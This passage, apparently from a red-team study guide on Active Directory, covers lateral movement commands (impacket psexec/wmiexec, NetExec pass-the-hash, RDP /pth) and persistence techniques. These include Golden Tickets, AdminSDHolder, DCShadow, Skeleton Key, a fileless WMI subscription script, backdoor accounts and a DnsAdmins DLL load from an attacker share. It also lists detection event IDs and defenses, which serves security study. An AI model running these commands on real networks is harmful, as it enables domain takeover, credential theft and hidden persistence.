impacket-psexec   corp.local/administrator:Pass123@host  # SYSTEM, installs service + uploads to ADMIN$ (noisy, Event 7045)
impacket-wmiexec  corp.local/administrator:Pass123@host  # WMI (Win32_Process), installs no service (quiet, semi-interactive)
impacket-smbexec  corp.local/administrator:Pass123@host  # temporary service + named pipe
impacket-atexec   corp.local/administrator:Pass123@host 'whoami'  # Task Scheduler (ATSvc)
impacket-dcomexec corp.local/administrator:Pass123@host  # DCOM (MMC20/ShellWindows)
# all support PtH:
impacket-wmiexec -hashes :<NThash> corp.local/administrator@host
# With Kerberos ticket (Pass-the-Ticket, Chapter 13):
impacket-psexec -k -no-pass corp.local/administrator@host.corp.local

# NetExec - multiple hosts + command
nxc smb hosts.txt -u administrator -H <NThash> -x 'whoami /all'    # cmd (-x), one by one
nxc smb host -u administrator -p Pass123 -X '$PSVersionTable'      # PowerShell (-X)
nxc smb hosts.txt -u administrator -H <NThash>                     # nereye admin? (Pwn3d!)
nxc winrm host -u administrator -H <NThash> -x 'whoami'

# local Windows binaries / sysinternals
PsExec.exe \\host -s cmd.exe                              # -s = SYSTEM
sc.exe \\host create evilsvc binPath= "cmd /c ..." start= auto && sc.exe \\host start evilsvc
schtasks /create /s host /tn upd /tr "cmd /c ..." /sc onstart /ru SYSTEM
wmic /node:host process call create "cmd /c ..."

# RDP (3389)
xfreerdp /u:administrator /p:Pass123 /v:host /dynamic-resolution
xfreerdp /u:administrator /pth:<NThash> /v:host          # Restricted Admin mode PtH (etkinse)

# WMI event (both lateral and persistence; see 14.7)
```

**Decision guide:** clean/interactive then `evil-winrm`. Quiet single command then `wmiexec`/`atexec`. If you do not mind SYSTEM and leaving files behind then `psexec` (but Event 7045 service installation is very visible). "Where am I admin?" across many hosts then `nxc smb hosts.txt` and look for the `Pwn3d!` marker. In a Kerberos-only environment (NTLM disabled) then a ticket with `-k -no-pass`.

**Detection/Defense:** psexec then Event **7045** (new service), 4697; the `PSEXESVC` name. wmiexec/atexec then **4688** (process create, `WmiPrvSE.exe` child), Task Scheduler **4698/4702**. WinRM then 4688 `wsmprovhost.exe`. Pass-the-Hash then 4624 **Logon Type 3 + NTLM** with a privileged account. Defense: LAPS (no reused local admin password on hosts), SMB signing, Restricted Admin + Credential Guard, the Tier model, the "Protected Users" group, restricting remote local admin logon (UAC remote restriction).

**Note:** psexec installs a service (7045, noisy); wmiexec does not (quiet). nxc `-x` = cmd, `-X` = PowerShell. `Pwn3d!` = local admin on that host. RDP `/pth` only works if "Restricted Admin mode" is enabled.

---

## 14.7 Persistence

The goal is to *consolidate and make permanent* administrator access. Two layers: **domain** (directory/identity level, the most valuable) and **host** (a single machine). Where possible, persistence is spread across *multiple* and *quiet* layers.

### Domain level

| Technique | Mechanism | Note |
| --- | --- | --- |
| **Golden Ticket** | Produce a forged TGT with the krbtgt hash | Domain-wide, long-lived. Production mechanics in **Section 13**. Here: the persistence value, valid as long as krbtgt is unchanged. |
| **Silver Ticket** | Produce a forged TGS with a service account hash | Access to a single service, never touches the DC (quiet). Mechanics in **Section 13**. |
| **Diamond/Sapphire Ticket** | Edit a real TGT / abuse S4U | Golden's detection-evading modern variants (Section 13). |
| **Granting a DCSync right** | Add a `GetChanges`/`GetChangesAll` ACE to a low account | A quiet hash-pull door (see `dacledit`/`Add-DomainObjectAcl`, 14.3). secretsdump whenever you want. |
| **AdminSDHolder / SDProp** | Add yourself with GenericAll to the ACL of the `AdminSDHolder` object | The **SDProp** process (~60 min) *re-propagates* this ACL to all protected groups (DA, EA, etc.), so even if you are removed from membership your right comes back. Very stubborn. |
| **DCShadow** | Register as a fake DC and "write" changes to the directory via replication | Bypasses the normal change logs (looks like DC-to-DC replication). mimikatz `lsadump::dcshadow`. |
| **Skeleton Key** | Inject a master password into DC LSASS | `mimikatz misc::skeleton`. Everyone logs in with their own password *or* the master password ("mimikatz"). In memory; gone on DC reboot (temporary). |
| **Golden gMSA** | Capture the root key (**KDS root key**) that derives a gMSA's `msDS-ManagedPassword` | KDS root key + gMSA SID then compute the password *offline*, even if it changes later. `GoldenGMSA.exe`. Even though the ReadGMSAPassword right would suffice, root key persistence is stronger. |
| **krbtgt double-reset evasion** | Resetting krbtgt *once* does not immediately invalidate an old Golden Ticket | The defender must reset krbtgt **twice in a row** (N+2 KVNO) with a wait between replications; if a single reset + a quick second reset is done wrong, the attacker can keep ticket validity alive. From the attacker's view: after a single reset the old Golden can still pass for a short while. |
| **ADCS certificate** | Obtain a valid certificate for a user/machine (14.4) | *Not affected* by a password change; PKINIT then TGT for years. One of the quietest domain persistences. |
| **SID History injection** | Add a DA/EA SID to a controlled account's `sIDHistory` | Golden Ticket extra-SID or `mimikatz sid::patch`+`sid::add`. Authority without showing group membership. |

### Host level

| Technique | Where | Command/Note |
| --- | --- | --- |
| **Registry Run key** | `HKLM/HKCU\...\Run` | `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v upd /d "C:\e.exe"`, runs at logon |
| **Scheduled task** | Task Scheduler | `schtasks /create /tn upd /tr C:\e.exe /sc onlogon /ru SYSTEM` |
| **Windows service** | SCM | `sc create evil binPath= "C:\e.exe" start= auto` (Event 7045) |
| **WMI event subscription** | WMI repo | `__EventFilter` + `CommandLineEventConsumer` + Binding, runs on a trigger (e.g. logon/time); little on-disk trace, very stealthy. `Register-WmiEvent` / `wmic`/`PowerLurk` |
| **Startup folder** | `shell:startup` | Copy a `.lnk`/exe |
| **New admin account** | local/domain | `net user bd P@ss /add & net localgroup administrators bd /add`; hidden group membership in the domain |
| **RID hijacking** | SAM | Make a low account's RID 500 (Administrator), so a normal-looking account logs in with admin authority. `mimikatz`/`reg` SAM edit |
| **COM hijacking** | `HKCU\Software\Classes\CLSID` | Redirect a legitimate CLSID to a malicious DLL, so it runs when the relevant application opens |
| **GPO startup script** | SYSVOL + GPO | A malicious startup script/immediate task (see 14.1, `SharpGPOAbuse`), domain-wide host persistence |
| **DnsAdmins DLL** | DNS service (DC) | If you are a DnsAdmins member, `dnscmd DC /config /serverlevelplugindll \\share\evil.dll`, so the DNS service (SYSTEM) loads the DLL, then trigger it with `sc stop/start dns`. Both privesc and persistence. |

```
# DnsAdmins → SYSTEM (the command for the group path in 14.1)
dnscmd DC01 /config /serverlevelplugindll \\attacker\share\evil.dll
sc.exe \\DC01 stop dns && sc.exe \\DC01 start dns        # DLLMain runs as SYSTEM

# WMI event subscription (persistent, fileless)
# (PowerShell, high level)
$F = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='f';EventNamespace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$C = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='c';CommandLineTemplate='C:\e.exe'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$F;Consumer=$C}
```

**Detection/Defense (persistence in general):**

- **Golden/Silver/krbtgt:** if the TGT lifetime is abnormally long, a nonexistent account in 4769, etype RC4 (0x17) on DA accounts. Defense: rotate krbtgt **twice** (with New-KrbtgtKeys.ps1, waiting between replications), which revokes old Golden/Silver. Put DAs in Protected Users (AES, no delegation).
- **DCSync right / AdminSDHolder:** Event **4662** (access to a directory object), the replication GUIDs `1131f6aa-...` (GetChanges), `1131f6ad-...` (GetChangesAll), `89e95b76-...` (GetChangesInFilteredSet), so alert when non-DC accounts access these GUIDs (requires a SACL at the domain root). Audit the AdminSDHolder ACL periodically (Event 5136).
- **DCShadow:** abnormal `nTDSDSA` object creation, configuration partition change; an unauthorized replication source.
- **Skeleton Key:** injection into LSASS on the DC (Event 4673/sysmon), 4624 RC4 downgrade; LSASS as a protected process (RunAsPPL) and Credential Guard prevent it.
- **Host persistence:** Run key, service (7045), scheduled task (4698/4700/4702), WMI subscription with Autoruns/Sysmon (Sysmon Event ID **19/20/21**: WmiEventFilter/Consumer/Binding). COM hijack then Autoruns. RID hijack then SAM audit.
- **DnsAdmins DLL:** the `dnscmd.exe ... /serverlevelplugindll` command line (4688), a DNS service restart; treat DnsAdmins as Tier-0 and remove membership.

**Note:** Golden (krbtgt, whole domain) vs Silver (service hash, single service, no contact with the DC). **AdminSDHolder/SDProp** restores the right even after you are removed (~60 min SDProp). **DCShadow** bypasses logs (looks like legitimate replication). **Skeleton Key** is in-memory/temporary (reboot = gone). Resetting krbtgt once is not enough; it must be rotated **twice**. The ADCS certificate and Golden gMSA (KDS root key) are the most stubborn persistences, *not affected* by a password reset.
